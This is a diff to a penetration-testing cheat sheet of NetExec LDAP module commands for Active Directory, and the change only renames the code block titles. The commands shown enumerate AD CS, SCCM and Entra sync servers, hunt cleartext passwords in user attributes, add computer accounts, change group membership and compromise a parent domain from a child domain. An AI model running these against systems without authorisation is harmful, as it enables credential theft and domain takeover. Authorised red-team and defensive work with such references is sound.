@@ -6,7 +6,7 @@
 
 Find PKI Enrollment Services in AD and list certificate template names. Cheap pre-flight before reaching for certipy.
 
-```sh title:"Find ADCS CAs and template names via LDAP"
+```sh title:"NetExec LDAP Modules Find ADCS CAs and template names via LDAP"
 nxc ldap $domain -u $user $auth_flags -M adcs
 ```
 <!-- cheat
@@ -20,7 +20,7 @@ import nxc_auth
 
 Check if the domain is vulnerable to the badSuccessor primitive (dMSA migration takeover).
 
-```sh title:"Check vulnerability to badSuccessor dMSA takeover"
+```sh title:"NetExec LDAP Modules Check vulnerability to badSuccessor dMSA takeover"
 nxc ldap $domain -u $user $auth_flags -M badsuccessor
 ```
 <!-- cheat
@@ -34,7 +34,7 @@ import nxc_auth
 
 Run certipy `find` from inside nxc with options to export results to text/csv/json. Defaults to vulnerable templates only.
 
-```sh title:"Run certipy find via nxc, default to vulnerable templates"
+```sh title:"NetExec LDAP Modules Run certipy find via nxc, default to vulnerable templates"
 nxc ldap $domain -u $user $auth_flags -M certipy-find
 ```
 <!-- cheat
@@ -48,7 +48,7 @@ import nxc_auth
 
 Detect ADIDNS zones that allow nonsecure dynamic updates. Anyone authenticated can write records into a nonsecure zone.
 
-```sh title:"ADIDNS zones with nonsecure dynamic updates"
+```sh title:"NetExec LDAP Modules ADIDNS zones with nonsecure dynamic updates"
 nxc ldap $domain -u $user $auth_flags -M dns-nonsecure
 ```
 <!-- cheat
@@ -62,7 +62,7 @@ import nxc_auth
 
 Dump FQDN and OS for every computer in the domain. Quick OS inventory.
 
-```sh title:"FQDN + OS for every computer in domain"
+```sh title:"NetExec LDAP Modules FQDN + OS for every computer in domain"
 nxc ldap $domain -u $user $auth_flags -M dump-computers
 ```
 <!-- cheat
@@ -76,7 +76,7 @@ import nxc_auth
 
 Find the Entra ID sync server. High-value box because it holds the AD Connect MSOL credential.
 
-```sh title:"Find Entra ID Connect sync server (MSOL credential host)"
+```sh title:"NetExec LDAP Modules Find Entra ID Connect sync server (MSOL credential host)"
 nxc ldap $domain -u $user $auth_flags -M entra-id
 ```
 <!-- cheat
@@ -90,7 +90,7 @@ import nxc_auth
 
 Find computer objects matching a text fragment. Faster than crafting a custom LDAP query when you just want a name match.
 
-```sh title:"Find computers matching free-text fragment"
+```sh title:"NetExec LDAP Modules Find computers matching free-text fragment"
 nxc ldap $domain -u $user $auth_flags -M find-computer -o NAME=$search
 ```
 <!-- cheat
@@ -105,7 +105,7 @@ var search
 
 Pull the `scriptPath` attribute from every user. Logon scripts on SYSVOL sometimes contain creds or pointers to interesting shares.
 
-```sh title:"scriptPath for every user (logon-script paths)"
+```sh title:"NetExec LDAP Modules scriptPath for every user (logon-script paths)"
 nxc ldap $domain -u $user $auth_flags -M get-scriptpath
 ```
 <!-- cheat
@@ -119,7 +119,7 @@ import nxc_auth
 
 List groups a specific user belongs to.
 
-```sh title:"List groups a specific user belongs to"
+```sh title:"NetExec LDAP Modules List groups a specific user belongs to"
 nxc ldap $domain -u $user $auth_flags -M groupmembership -o USER=$target_user
 ```
 <!-- cheat
@@ -134,7 +134,7 @@ var target_user
 
 Extract obsolete operating systems from LDAP. Out-of-support hosts are immediate vuln candidates.
 
-```sh title:"Out-of-support OSes via LDAP, vuln candidate list"
+```sh title:"NetExec LDAP Modules Out-of-support OSes via LDAP, vuln candidate list"
 nxc ldap $domain -u $user $auth_flags -M obsolete
 ```
 <!-- cheat
@@ -148,7 +148,7 @@ import nxc_auth
 
 Read Fine-Grained Password Policies (PSOs). Often laxer than the default policy on legacy/service accounts.
 
-```sh title:"Read Fine-Grained Password Policies (PSOs)"
+```sh title:"NetExec LDAP Modules Read Fine-Grained Password Policies (PSOs)"
 nxc ldap $domain -u $user $auth_flags -M pso
 ```
 <!-- cheat
@@ -162,7 +162,7 @@ import nxc_auth
 
 Find SCCM infrastructure published in AD. Pivot point for credential extraction (NAA, OSD, PXE).
 
-```sh title:"Find SCCM infra in AD (NAA / OSD / PXE pivot)"
+```sh title:"NetExec LDAP Modules Find SCCM infra in AD (NAA / OSD / PXE pivot)"
 nxc ldap $domain -u $user $auth_flags -M sccm
 ```
 <!-- cheat
@@ -176,7 +176,7 @@ import nxc_auth
 
 Enumerate AD Sites and Subnets. Maps the network from AD's perspective without scanning.
 
-```sh title:"AD Sites + Subnets, network map without scanning"
+```sh title:"NetExec LDAP Modules AD Sites + Subnets, network map without scanning"
 nxc ldap $domain -u $user $auth_flags -M subnets
 ```
 <!-- cheat
@@ -190,7 +190,7 @@ import nxc_auth
 
 Get details on the authenticated principal (group memberships, attributes).
 
-```sh title:"Details on authenticated principal (groups + attrs)"
+```sh title:"NetExec LDAP Modules Details on authenticated principal (groups + attrs)"
 nxc ldap $domain -u $user $auth_flags -M whoami
 ```
 <!-- cheat
@@ -204,7 +204,7 @@ import nxc_auth
 
 Pull the `description` field from every user. Lazy admins sometimes drop passwords here.
 
-```sh title:"description field for every user, scan for creds"
+```sh title:"NetExec LDAP Modules description field for every user, scan for creds"
 nxc ldap $domain -u $user $auth_flags -M get-desc-users
 ```
 <!-- cheat
@@ -218,7 +218,7 @@ import nxc_auth
 
 Pull the `info` (notes) field from every user. Same hunt as descriptions.
 
-```sh title:"info/notes field for every user, scan for creds"
+```sh title:"NetExec LDAP Modules info/notes field for every user, scan for creds"
 nxc ldap $domain -u $user $auth_flags -M get-info-users
 ```
 <!-- cheat
@@ -232,7 +232,7 @@ import nxc_auth
 
 Dump `unixUserPassword` attribute from every user. Often overlooked legacy attribute holding cleartext.
 
-```sh title:"unixUserPassword attribute (legacy cleartext store)"
+```sh title:"NetExec LDAP Modules unixUserPassword attribute (legacy cleartext store)"
 nxc ldap $domain -u $user $auth_flags -M get-unixUserPassword
 ```
 <!-- cheat
@@ -246,7 +246,7 @@ import nxc_auth
 
 Dump the `userPassword` attribute from every user. Rarely populated on Windows DCs but high payoff when it is.
 
-```sh title:"userPassword attribute (rare but high payoff)"
+```sh title:"NetExec LDAP Modules userPassword attribute (rare but high payoff)"
 nxc ldap $domain -u $user $auth_flags -M get-userPassword
 ```
 <!-- cheat
@@ -260,7 +260,7 @@ import nxc_auth
 
 Targeted scan of user descriptions for credential-shaped strings.
 
-```sh title:"Scan user descriptions for credential strings"
+```sh title:"NetExec LDAP Modules Scan user descriptions for credential strings"
 nxc ldap $domain -u $user $auth_flags -M user-desc
 ```
 <!-- cheat
@@ -274,7 +274,7 @@ import nxc_auth
 
 Add (or delete) a domain computer via SAMR or LDAPS. Required for RBCD and Shadow Credentials when MachineAccountQuota > 0.
 
-```sh title:"Add domain computer via SAMR/LDAPS for RBCD"
+```sh title:"NetExec LDAP Modules Add domain computer via SAMR/LDAPS for RBCD"
 nxc ldap $domain -u $user $auth_flags -M add-computer -o NAME=$rhost_name PASSWORD=$target_pass
 ```
 <!-- cheat
@@ -290,7 +290,7 @@ var target_pass
 
 Modify group membership for users or computers via LDAP. Usable when you have GenericWrite/GenericAll on the group.
 
-```sh title:"Modify group membership via LDAP write rights"
+```sh title:"NetExec LDAP Modules Modify group membership via LDAP write rights"
 nxc ldap $domain -u $user $auth_flags -M modify-group -o GROUP=$group_name USER=$target_user ACTION=add
 ```
 <!-- cheat
@@ -306,7 +306,7 @@ var target_user
 
 Identify pre-Windows-2000-compatible computer accounts (default password = lowercase samaccountname) and request TGTs for each.
 
-```sh title:"pre-W2k computer accounts, password == samaccountname"
+```sh title:"NetExec LDAP Modules pre-W2k computer accounts, password == samaccountname"
 nxc ldap $domain -u $user $auth_flags -M pre2k
 ```
 <!-- cheat
@@ -320,7 +320,7 @@ import nxc_auth
 
 Compromise the parent domain from a child domain via inter-realm trust abuse. Requires DA in the child.
 
-```sh title:"Child to parent domain compromise via trust (needs DA)"
+```sh title:"NetExec LDAP Modules Child to parent domain compromise via trust (needs DA)"
 nxc ldap $domain -u $user $auth_flags -M raisechild
 ```
 <!-- cheat
